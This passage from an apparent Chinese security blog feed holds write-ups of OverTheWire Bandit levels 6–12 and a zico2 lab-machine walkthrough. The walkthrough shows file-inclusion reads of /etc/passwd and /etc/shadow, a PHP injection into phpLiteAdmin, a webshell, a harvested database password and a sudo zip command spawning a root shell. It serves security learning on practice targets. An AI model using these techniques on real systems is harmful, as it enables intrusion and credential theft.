drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere14
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere15
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere16
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere17
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere18
drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere19<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果如下 我们使用find命令寻找目标文件</p>
<pre class="line-numbers language-none"><code class="language-none">find -size 1033c //在当前目录寻找大小为1033字节的文件
./maybehere07/.file2
cat ./maybehere07/.file2 //查看内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><blockquote>
<h1 id="Bandit-Level-6-→-Level-7"><a href="#Bandit-Level-6-→-Level-7" class="headerlink" title="Bandit Level 6 → Level 7"></a>Bandit Level 6 → Level 7</h1><h2 id="Level-Goal-6"><a href="#Level-Goal-6" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored <strong>somewhere on the server</strong> and has all of the following properties:</p>
<ul>
<li>owned by user bandit7</li>
<li>owned by group bandit6</li>
<li>33 bytes in size</li>
</ul>
</blockquote>
<p>这次直接没有指定目录了<br>给的目标文件特征为：<br><strong>文件所属者bandit7</strong><br><strong>文件所属组bandit6</strong><br><strong>大小33字节</strong><br>刚刚也给了相关的附加项 这里直接进行搜索 </p>
<pre class="line-numbers language-none"><code class="language-none">find / -user bandit7 -group bandit6 -size 33c
//以整个电脑范围寻找文件所属者为bandit7 文件所属组为bandit6 大小为33字节的文件
/var/lib/dpkg/info/bandit7.password
cat /var/lib/dpkg/info/bandit7.password //查看文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><blockquote>
<h1 id="Bandit-Level-7-→-Level-8"><a href="#Bandit-Level-7-→-Level-8" class="headerlink" title="Bandit Level 7 → Level 8"></a>Bandit Level 7 → Level 8</h1><h2 id="Level-Goal-7"><a href="#Level-Goal-7" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong> next to the word <strong>millionth</strong></p>
<h2 id="Commands-you-may-need-to-solve-this-level-5"><a href="#Commands-you-may-need-to-solve-this-level-5" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/man.1.html">man</a>, grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd<br>密码在data.txt之中 字符串靠近millionth<br>我们这里使用uniq命令来寻找data.txt中没有重复的行列</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">uniq data.txt|grep millionth
//删除data.txt中的重复行 并筛选出有millionth的那行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>密码直接就出来了</p>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><blockquote>
<h1 id="Bandit-Level-8-→-Level-9"><a href="#Bandit-Level-8-→-Level-9" class="headerlink" title="Bandit Level 8 → Level 9"></a>Bandit Level 8 → Level 9</h1><h2 id="Level-Goal-8"><a href="#Level-Goal-8" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong> and is the only line of text that occurs only once</p>
<h2 id="Commands-you-may-need-to-solve-this-level-6"><a href="#Commands-you-may-need-to-solve-this-level-6" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p>
</blockquote>
<p>和上题相似 但要找的是只出现过一次的内容<br>需要使用与uniq相似的sort命令来一起助力<br>同时使用uniq的附加项-u来显示仅显示出一次的行列</p>
<pre class="line-numbers language-none"><code class="language-none">sort data.txt|uniq -u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><blockquote>
<h1 id="Bandit-Level-9-→-Level-10"><a href="#Bandit-Level-9-→-Level-10" class="headerlink" title="Bandit Level 9 → Level 10"></a>Bandit Level 9 → Level 10</h1><h2 id="Level-Goal-9"><a href="#Level-Goal-9" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong> in one of the few human-readable strings, preceded by several ‘=’ characters.</p>
<h2 id="Commands-you-may-need-to-solve-this-level-7"><a href="#Commands-you-may-need-to-solve-this-level-7" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p>
</blockquote>
<p>这题要用到strings命令输出文件中可打印的字符 并筛选出与等号相接的</p>
<pre class="line-numbers language-none"><code class="language-none">strings data.txt|grep =<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><blockquote>
<h1 id="Bandit-Level-10-→-Level-11"><a href="#Bandit-Level-10-→-Level-11" class="headerlink" title="Bandit Level 10 → Level 11"></a>Bandit Level 10 → Level 11</h1><h2 id="Level-Goal-10"><a href="#Level-Goal-10" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong>, which contains base64 encoded data</p>
<h2 id="Commands-you-may-need-to-solve-this-level-8"><a href="#Commands-you-may-need-to-solve-this-level-8" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p>
</blockquote>
<p>data.txt中的密码经过base64加密 解密即可</p>
<pre class="line-numbers language-none"><code class="language-none">base64 -d data.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><blockquote>
<h1 id="Bandit-Level-11-→-Level-12"><a href="#Bandit-Level-11-→-Level-12" class="headerlink" title="Bandit Level 11 → Level 12"></a>Bandit Level 11 → Level 12</h1><h2 id="Level-Goal-11"><a href="#Level-Goal-11" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong>, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions</p>
<h2 id="Commands-you-may-need-to-solve-this-level-9"><a href="#Commands-you-may-need-to-solve-this-level-9" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p>
</blockquote>
<p>该密码经过凯撒密码(偏移量13)加密 放在网站里解密即可<br><img data-src="/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/4.jpg" alt="4"></p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>zico2解析</title>
    <url>/2024/03/28/zico2%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>攻击机：kali<br>靶机：zico2</p>
<h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><p>Poc Exp 和payload 的关系<br>dirb （网站目录扫描）<br>文件包含漏洞<br>mysql相关（虽然是图形化页面）<br>一句话木马+蚁剑<br>zip提权</p>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>先把俩机子开开<span id="more"></span><br>扫一下同网段设备<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>看到靶机开放了 22 80 56444等端口<br>我们访问http服务 没发现什么 用dirb扫描看一下<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/2.jpg" alt="2"><br>存在/dbadmin/目录 进入之后是个登陆页面 写着phpLiteAdmin v1.9.3<br> <img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/3.jpg" alt="3"><br>那就用searchsploit来寻找可行的漏洞<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/4.jpg" alt="4"><br>找到四个 我们用searchsploit -m 下载第三个漏洞文件到本地<br>下载后查看发现该文件中写着POC 也就是Proof of Concept 这是什么意思呢<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/6.jpg" alt="6"></p>
<blockquote>
<p>POC和EXP</p>
<p>POC = Proof of Concept中文意思是“观点证明”。这个短语并非仅仅在漏洞报告中使用，甲方在项目招标过程中也常常要求乙方提供POC，即证明你的方案或者产品能达到声称的功能或性能，漏洞报告中的POC则是一段说明或者一个攻击的样例，使得读者能够确认这个漏洞是真实存在的。</p>
<p>EXP = Exploit的中文意思是“漏洞利用”。意思是一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码，可以使得读者完全了解漏洞的机理以及利用的方法。</p>
<p>如下视图所示：<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/5.png" alt="5"></p>
<p>POC，是用来验证漏洞是否存在的一段代码。<br>EXP，指利用系统漏洞进行渗透。<br>先有POC，后有EXP。<br>Payload：中文为’有效载荷’，指成功EXP之后，真正在目标系统执行的代码或者指令<br>Shellcode：中文为’shell代码’，是Payload的一种，由于其建立正向/反向shell而得名 （正向/反向：主动/被动链接）</p>
</blockquote>
<p>绕过这个页面一般用burpsuite爆破<br>输入密码admin我们成功进入了页面<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/7.jpg" alt="7"><br>里边有一个没删的表 <code>info</code> 进去可以发现用户名root和zico与对应的密码md5加密 只要通过解密网站即可获取明文<br>主页面还有一个小按钮 按了之后发现连接中有文件包含漏洞<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/8.jpg" alt="8"><br>我们使用验证文件包含漏洞的方式 在传参中输入若干的 <code>../</code>(返回上个目录)<br>然后输入<code>/etc/passwd</code> <code>/etc/shadow</code> 若正常显示内容则表示漏洞存在<br>前者显示所有账号信息 后者显示所有用户名和密码<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/10.jpg" alt="10"><br>这里再回到之前调用的漏洞 其中说明了步骤</p>
<pre class="line-numbers language-none"><code class="language-none">1.创建一个database 名称为hack.php
2.在其中创建一个名为123的表 插入数据&lt;?php phpinfo()?&gt; 类型为TEXT
3.(使用文件包含漏洞即可)想办法运行hack.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/11.jpg" alt="11"><br>搞完之后放在文件包含漏洞里测试效果<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/12.jpg" alt="12"><br>这个页面就ok了<br>然后就都想得到嘛 用一句话代码 通过蚁剑连接<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/13.jpg" alt="13"><br>右键进入虚拟终端 在/home/zico/wordpress中查看wp-config.php的内容<br>发现一套密码<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/14.jpg" alt="14"></p>
<pre class="line-numbers language-none"><code class="language-none">/** MySQL database username */
define('DB_USER', 'zico');
/** MySQL database password */
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>账号为zico 密码为sWfCsfJSPV9H3AmQzw8<br>用这套密码和ssh登陆操作系统<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/15.jpg" alt="15"><br>登陆成功 使用sudo -l查看拥有sudo权限的命令 进行zip提权即可</p>
<pre class="line-numbers language-none"><code class="language-none">sudo zip 1.zip to_do.txt -T --unzip-command="sh -c /bin/bash"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/16.jpg" alt="16"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一个集合了各方之长的靶机 流程很长<br>那我们下次再见！</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>数据收集</title>
    <url>/2024/04/24/%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<html><head><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script></head><body></body></html>]]></content>
  </entry>
</search>
